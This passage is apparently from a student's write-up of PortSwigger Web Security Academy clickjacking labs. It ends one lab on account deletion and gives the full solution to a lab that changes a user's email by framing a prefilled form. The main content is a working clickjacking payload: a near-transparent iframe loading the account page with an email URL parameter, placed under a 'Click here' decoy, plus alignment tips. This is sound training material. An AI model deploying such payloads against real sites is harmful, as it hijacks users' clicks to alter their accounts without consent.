**-> once it is done view the exploit and check if the cursor on the "Click here" changes to pointing a hand, then it is being framed properly**<br>
**-> The target webpage containing the “Delete” option is hidden underneath the “Click here” option. When the user clicks the decoy, they are unknowingly clicking the hidden “Delete” option, resulting in the account being deleted**<br>

## LAB-2: Clickjacking with form input data prefilled from a URL parameter
<img width="1150" height="360" alt="image" src="https://github.com/user-attachments/assets/6b3ebd82-d7a5-46b9-bd81-222c3622581f" /><br>
### GOAL:
**We need to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button**<br>
### Soln:
**-> Login with the credentials provided (wiener:peter) and an "Update email" option is being displayed**<br>
<img width="755" height="347" alt="image" src="https://github.com/user-attachments/assets/42b19dda-4b65-470e-8ec7-ec88eee967fa" /><br>
**-> go to exploit server and then we need to frame HTML and insert in the body**<br>
```
<style>
     iframe {
			position: absolute;
			width: 900px;
			height: 700px;
			top: 10px;
			left: 100px;
			opacity: 0.00001;
	        z-index: 2;
     }
     div {
           position: absolute;
           top: 452px;
           left: 160px;
           z-index: 1;
</style>
  <div>Click here</div>
  <iframe src="https://0a4500a704c0d54e805ed0d1007d0060.web-security-academy.net/my-account?email=frank@gmail.com">
  </iframe>
```
**-> Make sure that the correct target URL is placed in the iframe, only then will the target page be displayed on the webpage**<br>
**-> Since the target page accepts form input through a GET parameter, we can fill the input field with a value automatically before the user enters anything by adding the parameter to the URL and then load that URL inside the iframe**<br>
**-> After injecting the HTML make sure that "Click here" option and "update email" option are aligned properly, if not adjust using "top,left" objects**<br>
**-> once it is done view the exploit and check if the cursor on the "Click here" changes to pointing a hand, then it is being framed properly**<br>
**->  The target webpage containing the “Update email” option is hidden underneath the visible “Click here” decoy. When the user clicks the decoy, the click is actually registered on the hidden “Update email” control, causing the email address to be changed without the user's awareness**<br>
### The lab is solved ✅<br><br>
